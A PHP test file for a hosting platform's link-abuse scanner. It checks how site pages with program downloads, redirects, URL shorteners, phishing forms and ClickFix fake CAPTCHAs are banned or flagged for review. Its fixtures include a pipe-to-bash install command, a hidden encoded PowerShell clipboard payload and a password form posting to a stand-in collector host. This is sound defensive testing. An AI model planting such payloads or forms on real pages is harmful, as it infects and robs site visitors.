<?php

namespace Tests\Feature;

use App\Abuse\LinkScanner;
use App\Models\Site;
use App\Models\User;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

/** What a site's pages send visitors to (App\Abuse\LinkScanner). */
class LinkScannerTest extends TestCase
{
    private function site(string $id = 'shopx'): Site
    {
        return Site::create(['user_id' => User::factory()->create(['email' => "$id@gmail.com"])->id, 'site_id' => $id,
            'domain' => "$id.codeinchrome.com", 'host' => 'h1', 'status' => 'live', 'cpu_limit' => '0.5', 'memory_limit' => '384m', 'port' => 20400]);
    }

    private function pages(array $pages): void
    {
        Http::fake(array_map(fn ($html) => Http::response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']), $pages)
            + ['*' => Http::response('not found', 404)]);
    }

    public function test_an_ordinary_site_is_clean_and_its_own_pages_are_followed(): void
    {
        $this->pages([
            'https://shopx.codeinchrome.com/' => '<a href="/about">About</a><a href="https://instagram.com/shop">Insta</a><a href="mailto:x@y.z">m</a>'
                .'<form action="/search"><input name="q"></form><a href="https://checkout.stripe.com/c/pay/1">Pay</a>',
            'https://shopx.codeinchrome.com/about' => '<a href="/files/menu.pdf">Menu</a><form method="post" action="/login"><input type="password" name="p"></form>',
        ]);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertSame([], $r['review']);
        $this->assertSame(2, $r['pages'], 'the /about page it links to was read too');
    }

    public function test_a_program_download_on_the_site_is_a_ban_and_one_elsewhere_is_a_review(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<a class="btn" href="/files/Setup.EXE">Download</a>'
            .'<a href="https://github.com/me/app/releases/download/v1/app.apk">Android</a>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertCount(1, $r['ban']);
        $this->assertStringContainsString('/files/Setup.EXE', $r['ban'][0]);
        // Anyone who can post a comment can plant a link elsewhere (the audit, 2026-09-25).
        $this->assertStringContainsString('program download elsewhere: https://github.com/me/app/releases/download/v1/app.apk', implode("\n", $r['review']));
    }

    public function test_a_copy_button_for_an_install_command_is_a_review_not_a_ban(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText)">Copy</button>'
            .'<pre>curl -fsSL https://get.example.dev/install.sh | bash</pre>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertStringContainsString("on the visitor's clipboard", implode("\n", $r['review']));
    }

    public function test_what_needs_a_persons_judgement_is_flagged_for_review(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<meta http-equiv="refresh" content="0; url=https://elsewhere.example/">'
            .'<a href="https://bit.ly/abc">Deal</a><a href="http://203.0.113.9/x">x</a><a href="https://mirror.example/pack.zip">zip</a>'
            .'<h1>Sign in to your PayPal account</h1><form method="post" action="https://collector.example/steal"><input type="password" name="pw"></form>']);
        $review = implode("\n", app(LinkScanner::class)->scan($this->site())['review']);
        foreach (['sends visitors on to another site', 'URL shortener', 'bare IP address', 'archive elsewhere',
            'a form posts what is typed to another site: collector.example', 'names "paypal": possible phishing'] as $want) {
            $this->assertStringContainsString($want, $review);
        }
    }

    public function test_lemon_squeezy_is_allowed_only_at_a_checkout(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<form method="post" action="https://store.lemonsqueezy.com/checkout/buy/abc"><button>Buy</button></form>'
            .'<meta http-equiv="refresh" content="0; url=https://attacker-store.lemonsqueezy.com/">']);
        $review = app(LinkScanner::class)->scan($this->site())['review'];
        $this->assertCount(1, $review, 'the checkout is fine; any other store page under lemonsqueezy.com is not');
        $this->assertStringContainsString('attacker-store.lemonsqueezy.com', $review[0]);
    }

    public function test_the_command_bans_on_downloads_reports_the_rest_and_gates_explore(): void
    {
        config(['fleet.owner_notify_email' => 'owner@example.com', 'fleet.mail_enabled' => true, 'fleet.tokens' => ['h1' => 't']]);
        $clean = $this->site('cleanx');
        $bad = $this->site('badx');
        $this->pages([
            'https://cleanx.codeinchrome.com/' => '<a href="/">home</a>',
            'https://badx.codeinchrome.com/' => '<a href="/downloads/tool.msi">Get it</a>',
            '127.0.0.1:9441/*' => '{"ok":true}',
        ]);
        $this->artisan('abuse:links')->assertSuccessful();
        $this->assertNotNull($clean->fresh()->links_clean_at);
        $this->assertNull($bad->fresh()->links_clean_at);
        $this->assertNotNull($bad->user->fresh()->banned_at);
        $this->assertStringContainsString('tool.msi', $bad->user->fresh()->banned_reason);
    }

    public function test_explore_lists_only_sites_that_passed_both_checks(): void
    {
        $site = $this->site('listed');
        Http::fake(['*' => Http::response('<h1>A real site</h1>', 200, ['Content-Type' => 'text/html'])]);
        app(\App\Showcase\Explore::class)->refresh();
        $this->assertSame([], app(\App\Showcase\Explore::class)->listed(), 'not scanned yet: not listed');

        $site->forceFill(['scanned_clean_at' => now(), 'links_clean_at' => now()])->save();
        app(\App\Showcase\Explore::class)->refresh();
        $this->assertSame(['listed.codeinchrome.com'], app(\App\Showcase\Explore::class)->listed());

        $site->forceFill(['links_clean_at' => null])->save();
        $this->assertSame([], app(\App\Showcase\Explore::class)->listed(), 'a site with links to review leaves the list at once');
    }

    public function test_a_home_page_that_redirects_within_the_site_is_followed(): void
    {
        Http::fake([
            'https://shopx.codeinchrome.com/' => Http::response('', 302, ['Location' => '/login']),
            'https://shopx.codeinchrome.com/login' => Http::response('<a href="/files/a.exe">x</a>', 200, ['Content-Type' => 'text/html']),
            '*' => Http::response('', 404),
        ]);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame(1, $r['pages']);
        $this->assertCount(1, $r['ban']);
    }

    public function test_a_clickfix_fake_captcha_is_a_ban(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<h1>Verify you are human</h1><button onclick="navigator.clipboard.writeText(\'powershell -w hidden -enc SQBFAFgA\')">I am not a robot</button>'
            .'<p>Press Windows + R, then Ctrl + V and Enter.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertStringContainsString('ClickFix malware page', implode("\n", $r['ban']));
    }

    public function test_win_r_and_paste_instructions_alone_are_a_review(): void
    {
        // A separate test: a second Http::fake for the same address does not replace the first.
        $this->pages(['https://shopx.codeinchrome.com/' => '<p>To finish verification press Win + R and paste the code.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertStringContainsString('possible ClickFix fake CAPTCHA', implode("\n", $r['review']));
    }

    public function test_a_copy_button_for_ordinary_text_is_not_flagged(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<button onclick="navigator.clipboard.writeText(\'SAVE10\')">Copy coupon</button><p>Use Ctrl + V at checkout.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertSame([], $r['review']);
    }
}
